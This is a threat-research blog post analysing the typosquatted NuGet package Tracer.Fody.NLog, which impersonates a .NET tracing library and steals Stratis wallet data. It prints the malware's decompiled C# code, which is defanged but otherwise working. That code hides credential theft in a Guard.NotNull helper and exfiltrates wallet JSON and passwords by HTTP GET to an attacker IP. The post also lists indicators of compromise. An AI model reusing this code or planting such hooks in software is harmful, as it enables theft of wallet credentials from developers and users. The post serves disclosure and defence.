---
title: "Malicious NuGet Package Typosquats Popular .NET Tracing Library to Steal Wallet Passwords"
short_title: "Malicious NuGet Typosquats .NET Tracing Library"
date: 2025-12-15 12:00:00 +0000
categories: [Malware, NuGet]
tags: [Typosquatting, NuGet, .NET, Homoglyphs, Wallet Theft, Supply Chain Security, Russian Link, T1585, T1587.001, T1608.001, T1195.002, T1204.005, T1036, T1656, T1552, T1005, T1041, T1657]
canonical_url: https://socket.dev/blog/malicious-nuget-package-typosquats-popular-net-tracing-library
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/060d679ce11fe53982f15f69b68710ba9d08ff80-1024x1024.png?w=1000&q=95&fit=max&auto=format
  alt: Malicious NuGet Package Typosquats Popular .NET Tracing Library
description: "Impostor NuGet package Tracer.Fody.NLog typosquats Tracer.Fody and its author, using homoglyph tricks, and exfiltrates Stratis wallet JSON/passwords to a Russian IP address."
toc: true
---

The Socket Threat Research Team uncovered a malicious NuGet package, [`Tracer.Fody.NLog`](https://socket.dev/nuget/package/tracer.fody.nlog), that typosquats and impersonates the legitimate [`Tracer.Fody`](https://socket.dev/nuget/package/tracer.fody) library and its maintainer. It presents itself as a standard .NET tracing integration but in reality functions as a cryptocurrency wallet stealer. Inside the malicious package, the embedded [`Tracer.Fody.dll`](https://socket.dev/nuget/package/tracer.fody.nlog/files/3.2.4/lib/net46/Tracer.Fody.dll) scans the default Stratis wallet directory, reads `*.wallet.json` files, extracts wallet data, and exfiltrates it together with the wallet password to threat actor-controlled infrastructure in Russia at `176[.]113[.]82[.]163`.

`Tracer.Fody.NLog` looks like a benign `NLog` adapter for `Tracer.Fody`, and on the NuGet Gallery it is published under the alias [`csnemess`](https://socket.dev/nuget/package/tracer.fody.nlog/maintainers/3.2.2), a one letter variation of the legitimate maintainer [`csnemes`](https://socket.dev/nuget/package/tracer.fody/maintainers/3.3.1). Inside the compiled `Tracer.Fody.dll` file, the threat actor added another layer of disguise by using homoglyphs (Cyrillic characters that resemble Latin letters) in attributes and type names. As a result, identifiers such as `Тrасer.Fоdy` and `Guаrd` look correct but are backed by different Unicode code points. This combination of lookalike package name, maintainer handle, and homoglyph-based identifiers makes `Tracer.Fody.NLog` easy to mistake for the genuine project during a manual review.

Once a project references the malicious package, it wires itself into the generic helper `Guard.NotNull<T>`. The first time that helper receives an object with a `WalletPassword` property, it starts a background routine that walks `%APPDATA%\StratisNode\stratis\StratisMain`, reads Stratis `*.wallet.json` files, and sends a truncated wallet JSON fragment and the associated password to `hxxp://176[.]113[.]82[.]163:4444/KV/addentry`. The code shows no prompt, writes no logs, and silently catches all exceptions, so the host application appears to run normally while wallet data leaves the compromised system.

`Tracer.Fody.NLog` was published in 2020 and has remained on the NuGet Gallery for more than five years, with roughly 2,000 downloads to date. This long dwell time, combined with its typosquatting and impersonation of the legitimate `Tracer.Fody` library and maintainer, increases the likelihood that it is already embedded in private Stratis related tools, developer workstations, or CI pipelines. At the time of writing, the malicious package remains live on the NuGet Gallery. We have reported it to the NuGet security team and requested the removal of the package and the suspension of the publisher's account.

![Socket AI Scanner analysis comparing Tracer.Fody.NLog and Tracer.Fody](https://cdn.sanity.io/images/cgdhsj6q/production/05f405a06b398c1478702ea963e66027e779c616-1429x820.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner's analysis flags the top package, [`Tracer.Fody.NLog`](https://socket.dev/nuget/package/tracer.fody.nlog), as known malware, while the bottom package, the legitimate [`Tracer.Fody`](https://socket.dev/nuget/package/tracer.fody), shows no malicious indicators and maintains strong supply chain security and other ratings._

## Typosquatting, Impersonation, and Homoglyphs

Logging frameworks and IL weaving tools such as `Fody` are deeply trusted in the .NET ecosystem. IL weavers are build-time tools that rewrite compiled .NET assemblies to inject extra behavior, for example adding logging or tracing calls into methods automatically. Teams add them early in a project, wire them into many call sites, and run them in contexts that routinely handle secrets, configuration, and application state. When a threat actor compromises one of these components, their code can execute across many code paths and in sensitive contexts without drawing attention.

`Fody` underpins a large family of IL weavers. Popular extensions like [`FodyHelpers`](https://socket.dev/nuget/package/fodyhelpers), [`Anotar.Serilog.Fody`](https://socket.dev/nuget/package/anotar.serilog.fody), [`Virtuosity.Fody`](https://socket.dev/nuget/package/virtuosity.fody), [`EmptyConstructor.Fody`](https://socket.dev/nuget/package/emptyconstructor.fody), and [`ToString.Fody`](https://socket.dev/nuget/package/tostring.fody) each have hundreds of thousands of downloads, and the core tracing weaver [`Tracer.Fody`](https://socket.dev/nuget/package/tracer.fody) alone has more than 370,000 downloads on NuGet. Developers are also used to seeing `Tracer.*.Fody` packages in their dependency trees and generally treat them as routine infrastructure.

`Tracer.Fody.NLog` takes advantage of that familiarity. Its name fits the existing `Tracer.*.Fody` pattern and its NuGet metadata mirrors the legitimate project, including a maintainer handle that differs from the real `csnemes` by only a single character (`csnemess`) and a package description that copies the original `Tracer.Fody` text verbatim. For someone quickly reviewing dependencies in a `.csproj` file or browsing the package page on NuGet, it looks like another officially-styled tracing extension rather than a suspicious package.

![NuGet search results showing Tracer.Fody family including malicious package](https://cdn.sanity.io/images/cgdhsj6q/production/b5d3ee0d3d63a09b3feb66400498aa5ac8229742-1233x702.png?w=1600&q=95&fit=max&auto=format)
_NuGet search results for the `Tracer.Fody` family show three legitimate tracing adapters published by `csnemes` and, at the bottom, the malicious typosquatted package `Tracer.Fody.NLog` published under the look-alike `csnemess` account, which reuses the same description to masquerade as a normal logging integration._

In the compiled `Tracer.Fody.dll` library, the threat actor adds another layer of disguise with homoglyphs. For example, the `AssemblyCompany` attribute is set to `Тrасer.Fоdy`, where several characters are Cyrillic lookalikes:

- `Т` is U+0422, a Cyrillic capital letter "te", instead of U+0054, the Latin capital letter "T"
- `а` is U+0430, a Cyrillic small letter "a", instead of U+0061, the Latin small letter "a"
- `с` is U+0441, a Cyrillic small letter "es", instead of U+0063, the Latin small letter "c"
- `о` is U+043E, a Cyrillic small letter "o", instead of U+006F, the Latin small letter "o".

The helper name `Guаrd` uses the same trick by hiding a Cyrillic `а` (U+0430) between Latin `G`, `u`, `r`, and `d`. Visually these identifiers render as `Tracer.Fody` and `Guard`, but their underlying Unicode code points are different, which makes simple string-based checks unreliable and helps the malicious library blend in with legitimate `Fody`-based tooling.

**Cautionary note:** AI-generated summaries in search results can unintentionally legitimize malicious software. When we searched for the malicious `Tracer.Fody.NLog` package, Google's AI Overview described it as a helpful NuGet adapter that integrates `Tracer.Fody` with `NLog` and improves logging performance. Do not take AI overviews at face value, and always verify the package name, maintainer, and code before adding a dependency.

![Google AI Overview describing Tracer.Fody.NLog as legitimate](https://cdn.sanity.io/images/cgdhsj6q/production/1845b21697f0146b0e929ae24462e0a795c96b2b-1015x731.png?w=1600&q=95&fit=max&auto=format)
_Google's AI Overview for `Tracer.Fody.NLog` describes the package as a standard `Tracer.Fody` / `NLog` integration that injects automatic method tracing and optimized logging, reinforcing the appearance of a legitimate logging adapter._

## Inside the Wallet Stealing Code

Below is the threat actor's code from [`Tracer.Fody.dll`](https://socket.dev/nuget/package/tracer.fody.nlog/files/3.2.2/lib/netstandard2.0/Tracer.Fody.dll), defanged and annotated with inline comments that highlight the malicious behavior.

```csharp
namespace Tracer.Fody
{
  internal static class Checker
  {
    private static bool alreadyChecked = false;

    // Hardcoded threat actor-controlled server.
    public static string ServerUrl = "hxxp://176[.]113[.]82[.]163:4444";

    public static void Check<T>(T value)
    {
      try
      {
        // Ensure the payload runs only once per process.
        if (!alreadyChecked)
        {
          alreadyChecked = true;

          // Reflection-based access to "WalletPassword"
          // on the object passed into Guard.NotNull<T>.
          string pass = value.GetType()
            .GetProperty("WalletPassword")
            .GetValue(value, null) as string;

          // Fire-and-forget asynchronous exfiltration.
          Task.Run(async () =>
          {
            await CheckAsync(pass).ConfigureAwait(false);
          });
        }
      }
      catch (Exception)
      {
        // Catches all exceptions to avoid breaking the host application,
        // which keeps the malicious behavior stealthy.
      }
    }

    private static async Task CheckAsync(string pass)
    {
      // Small delay, likely to avoid interfering with immediate startup.
      await Task.Delay(10).ConfigureAwait(false);

      // Enumerate all Stratis wallet files in the default data directory:
      // %APPDATA%\StratisNode\stratis\StratisMain\*.wallet.json
      string basePath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
        "StratisNode\\stratis\\StratisMain");

      foreach (string item in Directory.GetFiles(basePath, "*.wallet.json"))
      {
        // Read the entire wallet JSON file.
        string text = File.ReadAllText(item);

        // Truncate at "blockLocator" to shorten the payload.
        // This includes sensitive wallet metadata.
        string keyFragment = text.Substring(0, text.IndexOf("blockLocator"));

        // Exfiltrate wallet JSON fragment and wallet password.
        SendKV(keyFragment, pass);
      }
    }

    public static void SendKV(string key, string value)
    {
      // Exfiltration over HTTP GET query parameters.
      new WebClient().DownloadString(
        ServerUrl + "/KV/addentry?key=" + key + "&value=" + value);
    }
  }

  public static class Guard
  {
    public static T NotNull<T>(T value, string parameterName)
    {
      if (string.IsNullOrWhiteSpace(parameterName))
        throw new ArgumentNullException(parameterName);

      if (value == null)
        throw new ArgumentNullException(parameterName);

      // Malicious side effect injected into a generic null-check helper.
      // Any call to Guard.NotNull on an object with a WalletPassword property
      // will trigger Checker.Check and therefore wallet data exfiltration.
      Checker.Check(value);
      return value;
    }
  }
}
```

The code is aimed at Stratis wallets. It hardcodes the Stratis data directory (`%APPDATA%\StratisNode\stratis\StratisMain`) and scans for `*.wallet.json` files, then truncates each JSON payload at `"blockLocator"` before exfiltration. Stratis is a blockchain development platform implemented in C# on the .NET platform and marketed specifically to C# and .NET teams that want to build full nodes, wallets, and smart contracts without leaving their existing tooling.

The `WalletPassword` property, retrieved via reflection from the object passed into `Guard.NotNull<T>`, shows that the threat actor expects this helper to run against a wallet model or view model that holds the wallet password in memory. Once it has both the password and the wallet file contents, the code sends an HTTP GET request to `hxxp://176[.]113[.]82[.]163:4444/KV/addentry`, using the truncated wallet JSON as the `key` parameter and the password as the `value`. All exceptions are silently caught, so even if the exfiltration fails, the host application continues to run without any visible error while successful calls quietly leak wallet data to the threat actor's infrastructure.

## Not the Threat Actor's First Rodeo on NuGet Gallery

The Stratis wallet stealer in `Tracer.Fody.NLog` is not the first time this infrastructure has targeted .NET developers. In December 2023, Stephen Cleary, maintainer of the `AsyncEx` libraries on NuGet (for example [`Nito.AsyncEx`](https://socket.dev/nuget/package/nito.asyncex/)), [warned](https://x.com/aSteveCleary/status/1730994352132911613) that a NuGet package named [`Cleary.AsyncExtensions`](https://socket.dev/nuget/package/cleary.asyncextensions) published under the `stevencleary` alias was not his.

![Steve Cleary warning post about impersonating NuGet package](https://cdn.sanity.io/images/cgdhsj6q/production/258aad67ea6000bdd0b3937ff128b929ad797c3f-1478x708.png?w=1600&q=95&fit=max&auto=format)
_Steve Cleary [posts](https://x.com/aSteveCleary/status/1730994352132911613) about an impersonating NuGet package, [`Cleary.AsyncExtensions`](https://socket.dev/nuget/package/cleary.asyncextensions) published under `stevencleary`, which adds `NotNull` / `NotEmpty` argument validation helpers that capture parameters named `mnemonic` or `passphrase` and send them to `176[.]113[.]82[.]163:4444`, the same IP and port hardcoded in `Tracer.Fody.NLog` for Stratis wallet exfiltration._

![Socket AI Scanner analysis of Cleary.AsyncExtensions](https://cdn.sanity.io/images/cgdhsj6q/production/b9e4a885753ecf1328cf687a0fb01606c6d02b6b-624x629.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner's analysis of the malicious [`Cleary.AsyncExtensions`](https://socket.dev/nuget/package/cleary.asyncextensions) package shows a Stratis wallet `Guard` helper that siphons mnemonic and passphrase values from `NotNull` / `NotEmpty` checks into a background task, then quietly exfiltrates them to `176[.]113[.]82[.]163:4444` while suppressing exceptions and hiding behind homoglyph-based identifiers._

The IP `176[.]113[.]82[.]163` remains reachable and routable. It belongs to AS 48347 (MTW-AS), with WHOIS records attributing it to MT Finance LLC in Moscow, Russia. Recent scan data identifies a Windows host exposing several remote access services. Certificate telemetry shows an RDP service presenting the hostname `WIN-FTDPCG4548K`, with observations continuing into December 2025, which indicates the system is online and in active use.

## Outlook and Recommendations

By targeting IL weaving and logging adapters, typosquatting a well-known tracing library, and wiring its payload into generic helpers like `Guard.NotNull`, the threat actor turned routine parameter validation into a covert channel for Stratis wallet theft.

Defenders should expect to see similar activity and follow-on implants that extend this pattern. Likely targets include other logging and tracing integrations, argument validation libraries, and utility packages that are common in .NET projects. We anticipate variations that generalize beyond Stratis, for example targeting other blockchain wallets, cloud credentials, or authentication secrets, as well as new typosquats reusing homoglyph tricks and impersonated maintainers. The fact that this package remained live on NuGet for more than five years demonstrates that once such an implant lands in a popular ecosystem, it can persist quietly unless someone is explicitly looking for behavioral red flags rather than just CVEs.

Socket's security tooling is designed for exactly these types of supply chain threats. The [**Socket GitHub App**](https://socket.dev/features/github) provides real-time pull-request scanning, surfacing suspicious or malicious dependencies like `Tracer.Fody.NLog` and `cleary.asyncextensions` before they merge. The [**Socket CLI**](https://socket.dev/features/cli) integrates into local development and CI workflows, analyzing packages during install time and enforcing allow/deny rules on behaviors such as unexpected network egress, filesystem writes, post-install scripts, and native binaries.

The [**Socket browser extension**](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1) augments NuGet and other registry pages with live risk signals, warning developers when a package shows signs of malice. Finally, [**Socket MCP**](https://socket.dev/blog/socket-mcp) extends these protections into AI-assisted coding environments, detecting and warning when LLMs suggest malicious, typosquatted, or hallucinated packages before they enter your codebase.

## Indicators of Compromise (IOCs)

### Malicious NuGet Packages

- [`Tracer.Fody.NLog`](https://socket.dev/nuget/package/tracer.fody.nlog)
- [`Cleary.AsyncExtensions`](https://socket.dev/nuget/package/cleary.asyncextensions)

### Threat Actor's NuGet Aliases

- [`csnemess`](https://socket.dev/nuget/package/tracer.fody.nlog/maintainers/3.2.2)
- [`stevencleary`](https://www.nuget.org/profiles/stevencleary)

### Network Indicators

- `176[.]113[.]82[.]163`
- `hxxp://176[.]113[.]82[.]163:4444`
- `hxxp://176[.]113[.]82[.]163:4444/KV/addentry`

## MITRE ATT&CK

- T1585 — Establish Accounts
- T1587.001 — Develop Capabilities: Malware
- T1608.001 — Stage Capabilities: Upload Malware
- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1204.005 — User Execution: Malicious Library
- T1036 — Masquerading
- T1656 — Impersonation
- T1552 — Unsecured Credentials
- T1005 — Data from Local System
- T1041 — Exfiltration Over C2 Channel
- T1657 — Financial Theft
